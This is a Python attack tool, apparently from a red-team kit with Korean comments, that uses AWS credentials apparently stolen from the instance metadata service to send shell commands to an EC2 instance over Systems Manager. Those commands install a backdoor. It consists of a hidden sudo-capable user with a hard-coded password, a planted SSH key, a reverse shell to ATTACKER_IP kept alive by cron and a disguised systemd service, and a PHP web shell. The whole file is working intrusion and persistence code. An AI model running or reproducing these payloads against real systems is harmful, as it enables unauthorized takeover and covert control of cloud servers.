#!/usr/bin/env python3
"""
AWS Systems Manager 기반 백도어 설치

IMDS에서 탈취한 credentials를 사용하여 SSH 없이 EC2에 명령 실행
"""

import os
import sys
import time

try:
    import boto3
    from botocore.exceptions import ClientError
except ImportError:
    print("[-] boto3 설치 필요: pip3 install boto3")
    sys.exit(1)


class SSMBackdoor:
    def __init__(self, instance_id=None):
        # 환경 변수에서 credentials 로드
        self.access_key = os.environ.get('AWS_ACCESS_KEY_ID')
        self.secret_key = os.environ.get('AWS_SECRET_ACCESS_KEY')
        self.session_token = os.environ.get('AWS_SESSION_TOKEN')

        if not self.access_key:
            print("[-] AWS credentials를 찾을 수 없습니다")
            print("[!] 먼저 'imds' 명령어를 실행하세요")
            sys.exit(1)

        self.session = boto3.Session(
            aws_access_key_id=self.access_key,
            aws_secret_access_key=self.secret_key,
            aws_session_token=self.session_token
        )

        self.region = os.environ.get('AWS_DEFAULT_REGION', 'ap-northeast-2')
        self.ssm = self.session.client('ssm', region_name=self.region)
        self.ec2 = self.session.client('ec2', region_name=self.region)

        self.instance_id = instance_id

    def find_instance(self):
        """현재 인스턴스 ID 찾기"""
        if self.instance_id:
            return self.instance_id

        print("[*] EC2 인스턴스 검색 중...")
        try:
            instances = self.ec2.describe_instances(
                Filters=[{'Name': 'instance-state-name', 'Values': ['running']}]
            )

            for reservation in instances['Reservations']:
                for instance in reservation['Instances']:
                    instance_id = instance['InstanceId']
                    print(f"[+] 인스턴스 발견: {instance_id}")
                    self.instance_id = instance_id
                    return instance_id

        except ClientError as e:
            print(f"[-] 인스턴스 검색 실패: {e}")

        return None

    def send_command(self, commands):
        """SSM을 통해 명령 실행"""
        try:
            response = self.ssm.send_command(
                InstanceIds=[self.instance_id],
                DocumentName='AWS-RunShellScript',
                Parameters={'commands': commands}
            )

            command_id = response['Command']['CommandId']

            # 명령 완료 대기
            time.sleep(3)

            # 결과 가져오기
            output = self.ssm.get_command_invocation(
                CommandId=command_id,
                InstanceId=self.instance_id
            )

            return output['StandardOutputContent']

        except ClientError as e:
            print(f"[-] 명령 실행 실패: {e}")
            return None

    def install_backdoor(self):
        """백도어 설치"""
        print("╔" + "═"*58 + "╗")
        print("║" + " "*58 + "║")
        print("║" + "  AWS SSM 기반 백도어 설치".center(66) + "║")
        print("║" + " "*58 + "║")
        print("╚" + "═"*58 + "╝")
        print()

        # 인스턴스 찾기
        if not self.find_instance():
            print("[-] 타겟 인스턴스를 찾을 수 없습니다")
            return False

        print(f"[*] 타겟 인스턴스: {self.instance_id}")
        print()

        # 백도어 설치 스크립트
        backdoor_script = [
            '#!/bin/bash',
            'echo "[*] 백도어 사용자 생성 중..."',
            'useradd -m -d /var/opt/.sysupdate -s /bin/bash sysupdate 2>/dev/null || echo "사용자 이미 존재"',
            'echo "sysupdate:Sys@Update2024#Secure" | chpasswd',
            'echo "[+] 사용자 생성 완료"',
            '',
            'echo "[*] sudo 권한 부여 중..."',
            'echo "sysupdate ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/sysupdate',
            'chmod 440 /etc/sudoers.d/sysupdate',
            'echo "[+] sudo 권한 부여 완료"',
            '',
            'echo "[*] SSH 키 백도어 설정 중..."',
            'mkdir -p /var/opt/.sysupdate/.ssh',
            'chmod 700 /var/opt/.sysupdate/.ssh',
            'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8h5K9... redteam@localhost" > /var/opt/.sysupdate/.ssh/authorized_keys',
            'chmod 600 /var/opt/.sysupdate/.ssh/authorized_keys',
            'chown -R sysupdate:sysupdate /var/opt/.sysupdate/.ssh',
            'echo "[+] SSH 키 백도어 설정 완료"',
            '',
            'echo "[*] 리버스 쉘 스크립트 생성 중..."',
            'cat > /var/opt/.sysupdate/.system_check.sh << "EOFSCRIPT"',
            '#!/bin/bash',
            'ATTACKER_IP="CHANGEME"',
            'ATTACKER_PORT="4444"',
            'if command -v ncat &> /dev/null; then',
            '    ncat -e /bin/bash "$ATTACKER_IP" "$ATTACKER_PORT" 2>/dev/null',
            'elif command -v nc &> /dev/null; then',
            '    nc -e /bin/bash "$ATTACKER_IP" "$ATTACKER_PORT" 2>/dev/null',
            'fi',
            'EOFSCRIPT',
            'chmod +x /var/opt/.sysupdate/.system_check.sh',
            'chown sysupdate:sysupdate /var/opt/.sysupdate/.system_check.sh',
            'echo "[+] 리버스 쉘 스크립트 생성 완료"',
            '',
            'echo "[*] Cron 백도어 설정 중..."',
            '(crontab -u sysupdate -l 2>/dev/null; echo "0 * * * * /var/opt/.sysupdate/.system_check.sh") | crontab -u sysupdate -',
            'echo "[+] Cron 백도어 설정 완료"',
            '',
            'echo "[*] Systemd 서비스 백도어 설정 중..."',
            'cat > /etc/systemd/system/system-update-check.service << "EOFSERVICE"',
            '[Unit]',
            'Description=System Update Check Service',
            'After=network.target',
            '',
            '[Service]',
            'Type=simple',
            'User=sysupdate',
            'ExecStart=/var/opt/.sysupdate/.system_check.sh',
            'Restart=always',
            'RestartSec=3600',
            '',
            '[Install]',
            'WantedBy=multi-user.target',
            'EOFSERVICE',
            'systemctl daemon-reload',
            'systemctl enable system-update-check',
            'echo "[+] Systemd 서비스 백도어 설정 완료"',
            '',
            'echo "[*] 웹쉘 백도어 설치 중..."',
            'mkdir -p /var/www/html/.system',
            'cat > /var/www/html/.system/health.php << "EOFWEB"',
            '<?php',
            'header("Content-Type: application/json");',
            '$auth_key = "RedTeam2024";',
            'if (!isset($_GET["key"]) || $_GET["key"] !== $auth_key) {',
            '    http_response_code(403);',
            '    echo json_encode(["error" => "Unauthorized"]);',
            '    exit;',
            '}',
            'if (isset($_GET["cmd"])) {',
            '    $output = `$_GET["cmd"] 2>&1`;',
            '    echo json_encode(["status" => "success", "output" => $output]);',
            '} else {',
            '    echo json_encode(["status" => "online", "server" => gethostname()]);',
            '}',
            '?>',
            'EOFWEB',
            'chmod 644 /var/www/html/.system/health.php',
            'chown www-data:www-data /var/www/html/.system/health.php 2>/dev/null || chown apache:apache /var/www/html/.system/health.php 2>/dev/null',
            'echo "[+] 웹쉘 백도어 설치 완료"',
            '',
            'echo ""',
            'echo "╔════════════════════════════════════════════════╗"',
            'echo "║         백도어 설치 완료!                      ║"',
            'echo "╚════════════════════════════════════════════════╝"',
            'echo ""',
            'echo "사용자: sysupdate"',
            'echo "비밀번호: Sys@Update2024#Secure"',
            'echo ""',
        ]

        print("[*] SSM을 통해 백도어 설치 중...")
        print()

        result = self.send_command(backdoor_script)

        if result:
            print(result)
            print()
            print("╔" + "═"*58 + "╗")
            print("║" + " "*58 + "║")
            print("║" + "  백도어 설치 완료!".center(66) + "║")
            print("║" + " "*58 + "║")
            print("╚" + "═"*58 + "╝")
            print()
            return True
        else:
            print("[-] 백도어 설치 실패")
            return False


def main():
    instance_id = sys.argv[1] if len(sys.argv) > 1 else None

    backdoor = SSMBackdoor(instance_id)
    backdoor.install_backdoor()


if __name__ == '__main__':
    main()
